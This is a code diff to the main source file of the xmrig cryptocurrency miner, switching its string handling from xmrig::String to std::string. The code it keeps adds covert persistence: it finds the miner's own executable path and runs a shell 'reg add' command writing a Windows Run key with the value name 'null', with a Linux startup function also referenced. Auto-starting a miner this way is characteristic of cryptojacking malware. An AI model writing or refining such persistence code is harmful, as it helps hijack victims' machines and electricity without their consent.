@@ -19,7 +19,7 @@
 #include "App.h"
 #include "base/kernel/Entry.h"
 #include "base/kernel/Process.h"
-#include "base/crypto/String.h" // Для xmrig::String
+#include "string"
 #include <iostream>
 #include <cstdlib>
 
@@ -27,25 +27,25 @@
 #include <windows.h>
 #endif
 
-xmrig::String getExecutablePath() {
+std::string getExecutablePath() {
 #ifdef _WIN32
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
-    return xmrig::String(path);
+    return std::string(path);
 #else
     char path[4096];
     ssize_t count = readlink("/proc/self/exe", path, sizeof(path) - 1);
     if (count != -1) {
         path[count] = '\0';
-        return xmrig::String(path);
+        return std::string(path);
     }
-    return xmrig::String();
+    return "";
 #endif
 }
 
 #ifdef _WIN32
-void addToStartupWindows(const xmrig::String &path) {
-    xmrig::String command = xmrig::String("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v null /t REG_SZ /d \"") + path + "\" /f";
+void addToStartupWindows(const std::string &path) {
+    std::string command = std::string("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v null /t REG_SZ /d \"") + path + "\" /f";
     system(command.c_str());
 }
 #else
@@ -64,8 +64,8 @@ void addToStartupLinux(const xmrig::String &path) {
 int main(int argc, char **argv)
 {
     try {
-        xmrig::String exePath = getExecutablePath();
-        if (exePath.isEmpty()) {
+        std::string exePath = getExecutablePath();
+        if (exePath.empty()) {
             std::cerr << "Failed to determine executable path!" << std::endl;
             return 1;
         }
